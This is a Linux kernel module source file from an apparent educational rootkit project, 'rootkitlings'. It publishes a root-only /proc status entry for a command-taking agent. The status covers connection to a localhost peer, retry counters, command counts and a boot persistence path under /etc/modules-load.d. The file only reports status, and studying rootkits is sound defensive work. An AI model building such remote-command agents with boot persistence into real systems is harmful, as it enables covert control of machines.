// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

#include "agent.h"
#include "agent_status.h"
#include "transaction.h"

struct rk_agent_status_context {
	struct rk_agent *agent;
	struct rk_transaction *transaction;
};

static struct rk_agent_status_context status_context;
static struct proc_dir_entry *status_entry;

static int rk_agent_status_show(struct seq_file *output, void *unused)
{
	struct rk_agent_status status;

	(void)unused;
	rk_agent_snapshot(status_context.agent, &status);
	seq_printf(output,
		   "state=%s\nconnected=%u\npeer_address=127.0.0.1\n"
		   "peer_port=%u\nretry_base_ms=%u\nretry_max_ms=%u\n"
		   "retry_delay_ms=%u\nattempts=%llu\nconnections=%llu\n"
		   "commands=%llu\nretries=%llu\ntransport_errors=%llu\n"
		   "protocol_errors=%llu\nmarker=%s\n"
		   "boot_request_path=/etc/modules-load.d/rootkitlings.conf\n"
		   "boot_request_state=%s\nboot_request_exchanged=%u\n"
		   "boot_request_error=%d\n",
		   status.running ? "running" : "stopped",
		   status.connected ? 1U : 0U, status.peer_port,
		   status.retry_base_ms, status.retry_max_ms,
		   status.retry_delay_ms, status.attempts, status.connections,
		   status.commands, status.retries, status.transport_errors,
		   status.protocol_errors, status.marker,
		   rk_transaction_state_name(status_context.transaction),
		   status_context.transaction->exchanged ? 1U : 0U,
		   status_context.transaction->last_error);
	return 0;
}

static int rk_agent_status_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_agent_status_show, NULL);
}

static const struct proc_ops rk_agent_status_ops = {
	.proc_open = rk_agent_status_open,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

int rk_agent_status_publish(struct rk_agent *agent,
			    struct rk_transaction *transaction)
{
	if (!agent || !transaction || status_entry)
		return -EINVAL;
	status_context.agent = agent;
	status_context.transaction = transaction;
	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_AGENT_STATUS_PUBLISH)
		status_entry = NULL;
	else
		status_entry = proc_create("rootkitlings_agent", 0400, NULL,
					   &rk_agent_status_ops);
	if (status_entry)
		return 0;
	status_context.agent = NULL;
	status_context.transaction = NULL;
	return -ENOMEM;
}

void rk_agent_status_unpublish(void)
{
	proc_remove(status_entry);
	status_entry = NULL;
	status_context.agent = NULL;
	status_context.transaction = NULL;
}
